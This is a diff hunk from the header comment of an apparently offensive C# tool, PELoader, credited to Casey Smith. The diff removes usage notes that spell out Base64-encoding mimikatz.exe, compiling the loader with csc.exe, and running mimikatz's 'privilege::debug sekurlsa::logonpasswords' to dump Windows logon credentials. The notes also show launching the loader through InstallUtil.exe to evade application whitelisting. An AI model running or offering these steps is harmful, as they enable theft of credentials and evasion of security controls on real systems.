@@ -16,29 +16,6 @@ using System.Runtime.InteropServices;
 Author: Casey Smith, Twitter: @subTee
 License: BSD 3-Clause
  
- 
- * Base64 Encode Mimikatz In PowerShell- 
-$fileName = "mimikatz.exe"
-$fileContent = get-content $fileName
-$fileContentBytes = [System.Text.Encoding]::UTF8.GetBytes($fileContent)
-$fileContentEncoded = [System.Convert]::ToBase64String($fileContentBytes)
-$fileContentEncoded | set-content ($fileName + ".b64")
- 
- * [OR]
-byte[] AsBytes = File.ReadAllBytes(@"C:\Tools\Mimikatz.exe");
-String AsBase64String = Convert.ToBase64String(AsBytes);
-StreamWriter sw = new StreamWriter(@"C:\Tools\Mimikatz.b64");
-sw.Write(AsBase64String);
-sw.Close();
- * 
-C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /target:library /out:PELoader.dll PELoader.cs
-[OR]
-C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:PELoader.exe PELoader.cs
-PELoader.exe log privilege::debug sekurlsa::logonpasswords
- 
-[OR]
-C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U PELoader.exe
- 
 */
  
 namespace PELoader
